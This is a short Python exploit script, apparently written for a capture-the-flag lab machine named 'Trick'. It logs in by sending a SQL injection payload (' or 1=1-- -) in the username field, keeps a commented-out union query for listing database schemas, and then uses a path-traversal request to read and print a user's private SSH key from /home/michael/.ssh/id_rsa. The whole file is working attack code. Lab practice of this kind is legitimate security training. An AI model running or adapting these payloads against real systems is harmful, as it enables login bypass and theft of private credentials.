#!/usr/bin/python3

from urllib.parse import (
    quote,
    unquote
)
from pwn import *
import requests
import sys
from pprint import pprint

def sqli_intrussion(url: str) -> None:
    sess = requests.Session()
    ress = sess.post(url=url+"ajax.php?action=login", data={
        "username":"' or 1=1-- -",
        # "username":"' union select 1,schema_name from information_schema.schemata-- -",
        "password":"wherever you want!!!"
    })
    #print(ress.headers)
    #print(ress.cookies)

    new_ress = sess.get(url="http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa", allow_redirects=False)
    print(new_ress.text)


def main():

    try:
        url = sys.argv[1]
        sqli_intrussion(url)
    except Exception as e:
        log.failure(str(e))
        exit(1)
    except KeyboardInterrupt:
        log.info("Exiting...")
        exit(0)


if __name__ == "__main__":
    main()
